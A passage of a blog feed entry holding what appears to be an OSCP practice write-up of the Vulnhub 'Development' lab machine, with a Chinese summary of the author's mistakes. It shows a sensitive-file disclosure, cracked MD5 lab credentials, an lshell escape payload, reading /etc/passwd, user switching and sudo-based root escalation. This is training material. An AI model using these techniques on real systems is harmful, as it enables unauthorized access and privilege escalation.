href="http://192.168.92.164:8080/developmentsecretpage/">http://192.168.92.164:8080/developmentsecretpage/</a>. Find a link</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/4.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/patrick.php">http://192.168.92.164:8080/developmentsecretpage/patrick.php</a>. Find a link again</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/5.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/patrick.php?logout=1">http://192.168.92.164:8080/developmentsecretpage/patrick.php?logout=1</a>. Try to submit the form</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/6.png" style="width:800px"><br><p><strong>After submit the form.Get an error</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/7.png" style="width:800px"><br><p><strong>Searching the file name in Google.Get a sensitive data disclosure bug</strong></p><p><strong>Reference:</strong></p><p><a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a></p><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/slog_users.txt">http://192.168.92.164:8080/developmentsecretpage/slog_users.txt</a>. Get four accounts’ username and password</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/8.png" style="width:800px"><br><p><strong>Credentials here:</strong></p><p>admin, 3cb1d13bb83ffff2defe8d1443d3a0eb</p><p>intern, 4a8a2b374f463b7aedbb44a066363b81</p><p>patrick, 87e6d56ce79af90dbe07d387d3d0579e</p><p>qiu, ee64497098d0926d198f54f6d5431f98</p><br><p><strong>go to <a href="https://www.somd5.com/">https://www.somd5.com/</a> website to crack above password md5 hash.</strong></p><p><strong>Plaintext username and password here:</strong></p><p>patrick:P@ssw0rd25</p><p>intern:12345678900987654321</p><p>qiu:qiu</p><br><p><strong>Try to use above username and password logging ssh. Only user “intern” logging successfully. But our shell is a limited shell named “lshell”</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/9.png" style="width:500px"><br><p><strong>note that we can use command “echo”</strong></p><p><strong>escape payload:</strong></p><p><span style="color:blue">echo &amp;&amp; ‘bash’</span></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/10.png" style="width:500px"><br><p><strong>Enum target information.</strong></p><p><span style="color:blue">cat /etc/passwd</span></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/11.png" style="width:800px"><br><p><strong>Note there a user “patrick”. We have this account’s password by SiTeFiLo “sensitive data disclosure bug” before.</strong></p><p><strong>Try to use command “su” to privilege lateral move to user <span style="color:red">“patrick”</span> associated password <span style="color:red">“P@ssw0rd25”</span>.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/12.png" style="width:500px"><br><p><strong>Eunmeration the sudo Permissions for user “patrick”</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/13.png" style="width:500px"><br><p><strong>use vim to get root permission.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/14.png" style="width:500px"><br><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/15.png" style="width:500px"><br><p><strong>Proof:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/16.png" style="width:800px">]]></content>
    
    
    <summary type="html">&lt;p&gt;临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;靶机地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/digitalworldlocal-development,280/&quot;&gt;https://www.vulnhub.com/entry/digitalworldlocal-development,280/&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt; &lt;strong&gt;stuck:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、关键时候。。忘了查看网页源代码。关看提示的字去了，看了攻略才发现藏在网页源代码里。。。犯了低级错误。。&lt;/p&gt;
&lt;p&gt;2、网页报错的时候，没有想到去搜索文件名。看了攻略才发现百度能搜到相关的 exploit&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;OSCP Exam Report 的模板在此：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&quot;&gt;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
</feed>
